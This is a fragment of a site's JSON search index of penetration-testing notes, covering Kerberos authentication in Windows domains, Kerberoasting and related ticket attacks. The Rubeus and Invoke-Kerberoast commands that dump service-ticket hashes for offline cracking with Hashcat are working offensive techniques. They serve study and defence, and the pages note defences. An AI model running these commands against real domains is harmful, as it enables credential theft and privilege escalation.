href=&quot;https://cardboard-iguana.com/grimoire/spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; (use the 13100 hash mode).&lt;/p&gt;"},"spells/Kerberoasting-with-Rubeus":{"slug":"spells/Kerberoasting-with-Rubeus","filePath":"spells/Kerberoasting with Rubeus.md","title":"Kerberoasting with Rubeus","links":["spells/Hashcat"],"tags":["OS/Windows/ActiveDirectory","Protocol/Kerberos","AttackCycle/Exploitation/Kerberoasting","Application/Rubeus","Application/Hashcat"],"content":"# Extract password hashes for all known kerberoastable accounts using\n# Rubeus.\n#\nRubeus.exe kerberoast\nThe password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Extract password hashes for all known kerberoastable accounts using&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Rubeus.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Rubeus.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; kerberoast&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The password hashes output here can then be cracked with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; (use the 13100 hash mode).&lt;/p&gt;"},"spells/Kerberoasting":{"slug":"spells/Kerberoasting","filePath":"spells/Kerberoasting.md","title":"Kerberoasting","links":["spells/Kerberoasting-with-Impacket","spells/Kerberoasting-with-Rubeus","spells/Hashcat","spells/John-the-Ripper"],"tags":["Protocol/Kerberos","OS/Windows/ActiveDirectory","AttackCycle/Exploitation/Kerberoasting","Application/PowerShell/Invoke-Kerberoast","Application/Hashcat","Application/JohnTheRipper"],"content":"Kerberoasting is where a service ticket is used to brute force a service password. This password can then be used to either move laterally or (if the service runs with elevated privileges) to elevate your privileges. Note that not every account is kerberoastable; the Kali Linux tool Bloodhound can be used to identify potentially kerberoastable accounts.\nImpacket\nTransclude of Kerberoasting-with-Impacket\nRubeus\nTransclude of Kerberoasting-with-Rubeus\nInvoke-Kerberoast\nThe Invoke-Kerberoast PowerShell module can be used to create a dump of service tickets that can then be attacked offline using Hashcat or John the Ripper. (Note that calling Out-File with the -Width 8000 option is important in the below example, as otherwise the ticket can be truncated!)\nInvoke-Kerberoast -OutputFormat Hashcat |\n\tSelect-Object Hash |\n\tOut-File -filepath &quot;$FILE_PATH&quot; -Width 8000\nDefenses\nThe main defenses against kerberoasting are (1) strong passwords and (2) making sure you’re not running any services as domain admin (which you shouldn’t need to do in this day and age anyway).","richContent":"&lt;p&gt;Kerberoasting is where a service ticket is used to brute force a service password. This password can then be used to either move laterally or (if the service runs with elevated privileges) to elevate your privileges. Note that not every account is kerberoastable; the Kali Linux tool Bloodhound can be used to identify potentially kerberoastable accounts.&lt;/p&gt;\n&lt;h2 id=&quot;impacket&quot;&gt;Impacket&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#impacket&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Kerberoasting-with-Impacket&quot; data-block=&quot;&quot; data-embed-alias=&quot;Kerberoasting with Impacket&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberoasting-with-Impacket&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Kerberoasting-with-Impacket&quot;&gt;Transclude of Kerberoasting-with-Impacket&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;rubeus&quot;&gt;Rubeus&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#rubeus&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Kerberoasting-with-Rubeus&quot; data-block=&quot;&quot; data-embed-alias=&quot;Kerberoasting with Rubeus&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberoasting-with-Rubeus&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Kerberoasting-with-Rubeus&quot;&gt;Transclude of Kerberoasting-with-Rubeus&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;invoke-kerberoast&quot;&gt;Invoke-Kerberoast&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#invoke-kerberoast&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The &lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;&lt;code&gt;Invoke-Kerberoast&lt;/code&gt;&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; PowerShell module can be used to create a dump of service tickets that can then be attacked offline using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/John-the-Ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/John-the-Ripper&quot;&gt;John the Ripper&lt;/a&gt;. (Note that calling Out-File with the &lt;code&gt;-Width 8000&lt;/code&gt; option is important in the below example, as otherwise the ticket can be truncated!)&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-Kerberoast&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;OutputFormat Hashcat &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tSelect-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; Hash &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tOut-File&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;filepath &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;FILE_PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Width &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;8000&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;defenses&quot;&gt;Defenses&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#defenses&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The main defenses against kerberoasting are (1) strong passwords and (2) making sure you’re not running any services as domain admin (which you shouldn’t need to do in this day and age anyway).&lt;/p&gt;"},"spells/Kerberos":{"slug":"spells/Kerberos","filePath":"spells/Kerberos.md","title":"Kerberos","links":["spells/Mimikatz","spells/Rubeus","spells/Kerberoasting","spells/AS-REP-roasting","spells/Golden-and-silver-ticket-attacks"],"tags":["Protocol/Kerberos","OS/Windows/ActiveDirectory","Application/Mimikatz","Application/Rubeus","FileFormat/kirbi","Cryptography/Hashes/NT","AttackCycle/PrivEsc","AttackCycle/LateralMovement","AttackCycle/Exploitation/Kerberoasting","Application/PowerShell/Invoke-Kerberoast","Application/Hashcat","Application/JohnTheRipper","OS/Linux/Distros/Kali","AttackCycle/Exploitation/AS-REPRoasting","AttackCycle/PrivEsc/GoldenTickets","AttackCycle/LateralMovement/SilverTickets"],"content":"Kerberos: The default authentication method for Windows domains. Intended to be the successor to NTLM.\nThe built-in Windows command klist will show you the current Kerberos tickets in memory.\nTerminology\n\nTicket Granting Ticket (TGT): An authentication ticket that can be used to request service tickets for specific domain services from the ticket granting service.\nKey Distribution Center (KDC): A domain service that issues tickets; typically composed of the ticket granting service and the authentication service.\nAuthentication Service (AS): Issues ticket granting tickets. (Presumably in charge of authenticating users and automations.)\nTicket Granting Service (TGS): Issues tickets for domain services (and machines?) when presented with a ticket granting ticket. (Presumably in charge of authorizing users and automations.)\nService Principal Name (SPN): A service identifier. On Windows, SPNs associates a particular service instance with a domain account. All services must have a domain service account. (But it sounds like services might be associated with multiple accounts via multiple principal names assigned to multiple running instances?)\nKDC Long Term Secret Key (KDC LT Key): A secret key used to encrypt ticket granting tickets and sign privilege attribute certificates. This is the NT hash of the KRBTGT service account.\nService Long Term Secret Key (Service LT Key): A secret key associated with a particular service. Used to encrypt the service portion of a service ticket and sign privilege attribute certificates. Held by individual domain service accounts.\nSession Key: Issued with a ticket to identify a particular user session. Services expects both a ticket and a session key to be present before acting on a user’s behalf.\nPrivilege Attribute Certificate (PAC): A bundle of the user’s identifying information, which is provided along with the tickets. Importantly, this contains the user’s username and (on Windows) SID.\n\nNote that Active Directory bundles the authentication service, ticket granting service, and KDC into a single “domain controller” role. Non-Windows Kerberos implementations are more likely to separate these roles between different servers.\nAuthentication process\nThe below steps are cut-and-pasted from Wikipedia’s walk-through, but with language adapted to match the Windows-specific environment Kerberos is most commonly deployed in. (A close reading of these steps will also explain why it’s sometimes said that “a hash is as good as a password” for a Window’s domain.)\nClient authentication to the KDC (a.k.a. “pre-authentication”)\n\n\nAS-REQ: The client sends the client/user ID + the current timestamp (the timestamp is used to prevent replay attacks) encrypted with the NT hash of the user’s password + a cleartext message of the user ID to the authentication server to request services on behalf of the user.\n\n\nAS-REP: The authentication server checks to see if the client/user ID is in its database and if it can decrypt the timestamp using the NT hash of the password stored there. If it can, then the authentication server sends back the following two messages to the client:\n\nMessage A: Client/TGS Session Key encrypted using the NT hash of the client/user.\nMessage B: Ticket Granting Ticket (including the privilege attribute certificate, client network address, ticket validity period, and the Client/TGS Session Key) encrypted using the KDC long term secret key.\n\n\n\nOnce the client receives messages A and B, it attempts to decrypt message A with the NT hash generated from the password entered by the user. If the user entered password does not match the password in the authentication service database then decryption of message A will fail. Once message A is decrypted, the client obtains the Client/TGS Session Key. This session key is used for further communications with the ticket granting service.\n\n\n\n\n                  \n                  Important\n                  \n                \n\n\nThe client cannot decrypt Message B, as it is encrypted using the KDC long term secret key.)\n\n\n\nClient service authorization\n\n\nTGS-REQ: When requesting services, the client sends the following messages to the ticket granting service:\n\nMessage C: Composed of the ticket granting ticket and the service principal name of the requested service.\nMessage D: Authenticator (which is composed of the client ID and the timestamp), encrypted using the Client/TGS Session Key.\n\n\n\nTGS-REP: Upon receiving messages C and D, the ticket granting service retrieves the ticket granting ticket out of message C and decrypts it using the KDC long term secret key. This gives it the Client/TGS Session Key and the client ID (the client ID is part of the privilege attribute certificate). Using the Client/TGS Session Key, the ticket granting service decrypts message D (Authenticator) and compares the client IDs from the ticket granting ticket and message D; if they match, the server sends the following two messages to the client:\n\nMessage E: Service ticket (which includes the privilege attribute certificate, client network address, validity period, and Client/Server Session Key) encrypted using the service’s long term secret key.\nMessage F: Client/Server Session Key encrypted with the Client/TGS Session Key.\n\n\n\nClient service access\n\n\nAP-REQ: Upon receiving messages E and F from ticket granting service, the client has enough information to authenticate itself to the service server. The client connects to the service server and sends the following two messages:\n\nMessage E: The service ticket (as provided by the ticket granting service; see above).\nMessage G: A new Authenticator, which includes the client ID, timestamp and is encrypted using Client/Server Session Key.\n\n\n\nAP-REP: The service server decrypts the service ticket (message E) using its long term secret key to retrieve the Client/Server Session Key. Using the sessions key, it then decrypts the Authenticator and compares client ID from the service ticket and message G. If they match the server sends the following message to the client to confirm its true identity and willingness to serve the client:\n\nMessage H: The timestamp found in client’s Authenticator (sometimes modified, depending upon the version of Kerberos being used), encrypted using the Client/Server Session Key.\n\n\n\nThe client decrypts the confirmation (message H) using the Client/Server Session Key and checks whether the timestamp is correct. If so, then the client can trust the server and can start issuing service requests to the server.\n\n\nThe server provides the requested services to the client.\n\n\nExploitation\n.kirbi files\nThere’s a bit of terminology creep when discussing Kerberos tickets. Mimikatz and Rubeus are actually dumping Kerberos data structures (as .kirbi files), which contain both a ticket and the corresponding session key. People tend to call these .kirbi files “tickets”, but it’s worth keeping in mind that they contain both pieces of data (as a “ticket” in the Kerberos sense, not the hacker’s sense, isn’t useful without the corresponding session key).\nKerberoasting\nTransclude of Kerberoasting\nAS-REP roasting\nTransclude of AS-REP-roasting\nPass the ticket attacks\nThe only real way to defend against this attack is to only allow domain admins to log into domain controllers, not lower privileged machines!\nGolden/silver ticket attacks\nTransclude of Golden-and-silver-ticket-attacks","richContent":"&lt;p&gt;Kerberos: The default authentication method for Windows domains. Intended to be the successor to NTLM.&lt;/p&gt;\n&lt;p&gt;The built-in Windows command klist will show you the current Kerberos tickets in memory.&lt;/p&gt;\n&lt;h2 id=&quot;terminology&quot;&gt;Terminology&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#terminology&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;strong&gt;Ticket Granting Ticket (TGT):&lt;/strong&gt; An authentication ticket that can be used to request service tickets for specific domain services from the ticket granting service.&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Key Distribution Center (KDC):&lt;/strong&gt; A domain service that issues tickets; typically composed of the ticket granting service and the authentication service.&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Authentication Service (AS):&lt;/strong&gt; Issues ticket granting tickets. (Presumably in charge of &lt;em&gt;authenticating&lt;/em&gt; users and automations.)&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Ticket Granting Service (TGS):&lt;/strong&gt; Issues tickets for domain services (and machines?) when presented with a ticket granting ticket. (Presumably in charge of &lt;em&gt;authorizing&lt;/em&gt; users and automations.)&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Service Principal Name (SPN):&lt;/strong&gt; A service identifier. On Windows, SPNs associates a particular service instance with a domain account. All services must have a domain service account. (But it sounds like services might be associated with &lt;em&gt;multiple&lt;/em&gt; accounts via multiple principal names assigned to multiple running instances?)&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;KDC Long Term Secret Key (KDC LT Key):&lt;/strong&gt; A secret key used to encrypt ticket granting tickets and sign privilege attribute certificates. This is the NT hash of the KRBTGT service account.&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Service Long Term Secret Key (Service LT Key):&lt;/strong&gt; A secret key associated with a particular service. Used to encrypt the service portion of a service ticket and sign privilege attribute certificates. Held by individual domain service accounts.&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Session Key:&lt;/strong&gt; Issued with a ticket to identify a particular user session. Services expects &lt;em&gt;both&lt;/em&gt; a ticket and a session key to be present before acting on a user’s behalf.&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Privilege Attribute Certificate (PAC):&lt;/strong&gt; A bundle of the user’s identifying information, which is provided along with the tickets. Importantly, this contains the user’s username and (on Windows) SID.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that Active Directory bundles the authentication service, ticket granting service, and KDC into a single “domain controller” role. Non-Windows Kerberos implementations are more likely to separate these roles between different servers.&lt;/p&gt;\n&lt;h2 id=&quot;authentication-process&quot;&gt;Authentication process&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#authentication-process&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The below steps are cut-and-pasted from &lt;a href=&quot;https://en.wikipedia.org/wiki/Kerberos_%28protocol%29&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Wikipedia’s walk-through&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but with language adapted to match the Windows-specific environment Kerberos is most commonly deployed in. (A close reading of these steps will also explain why it’s sometimes said that “a hash is as good as a password” for a Window’s domain.)&lt;/p&gt;\n&lt;h2 id=&quot;client-authentication-to-the-kdc-aka-pre-authentication&quot;&gt;Client authentication to the KDC (a.k.a. “pre-authentication”)&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#client-authentication-to-the-kdc-aka-pre-authentication&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;AS-REQ: The client sends the client/user ID + the current timestamp (the timestamp is used to prevent replay attacks) encrypted with the NT hash of the user’s password + a cleartext message of the user ID to the authentication server to request services on behalf of the user.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;AS-REP: The authentication server checks to see if the client/user ID is in its database and if it can decrypt the timestamp using the NT hash of the password stored there. If it can, then the authentication server sends back the following two messages to the client:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Message A: &lt;em&gt;Client/TGS Session Key&lt;/em&gt; encrypted using the NT hash of the client/user.&lt;/li&gt;\n&lt;li&gt;Message B: &lt;em&gt;Ticket Granting Ticket&lt;/em&gt; (including the privilege attribute certificate, client network address, ticket validity period, and the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;) encrypted using the KDC long term secret key.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Once the client receives messages A and B, it attempts to decrypt message A with the NT hash generated from the password entered by the user. If the user entered password does not match the password in the authentication service database then decryption of message A will fail. Once message A is decrypted, the client obtains the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;. This session key is used for further communications with the ticket granting service.&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The client cannot decrypt Message B, as it is encrypted using the KDC long term secret key.)&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;client-service-authorization&quot;&gt;Client service authorization&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#client-service-authorization&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;TGS-REQ: When requesting services, the client sends the following messages to the ticket granting service:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Message C: Composed of the ticket granting ticket and the service principal name of the requested service.&lt;/li&gt;\n&lt;li&gt;Message D: Authenticator (which is composed of the client ID and the timestamp), encrypted using the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;TGS-REP: Upon receiving messages C and D, the ticket granting service retrieves the ticket granting ticket out of message C and decrypts it using the KDC long term secret key. This gives it the &lt;em&gt;Client/TGS Session Key&lt;/em&gt; and the client ID (the client ID is part of the privilege attribute certificate). Using the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;, the ticket granting service decrypts message D (Authenticator) and compares the client IDs from the ticket granting ticket and message D; if they match, the server sends the following two messages to the client:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Message E: &lt;em&gt;Service ticket&lt;/em&gt; (which includes the privilege attribute certificate, client network address, validity period, and &lt;em&gt;Client/Server Session Key&lt;/em&gt;) encrypted using the service’s long term secret key.&lt;/li&gt;\n&lt;li&gt;Message F: &lt;em&gt;Client/Server Session Key&lt;/em&gt; encrypted with the &lt;em&gt;Client/TGS Session Key&lt;/em&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=&quot;client-service-access&quot;&gt;Client service access&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#client-service-access&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;AP-REQ: Upon receiving messages E and F from ticket granting service, the client has enough information to authenticate itself to the service server. The client connects to the service server and sends the following two messages:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Message E: The &lt;em&gt;service ticket&lt;/em&gt; (as provided by the ticket granting service; see above).&lt;/li&gt;\n&lt;li&gt;Message G: A new Authenticator, which includes the client ID, timestamp and is encrypted using &lt;em&gt;Client/Server Session 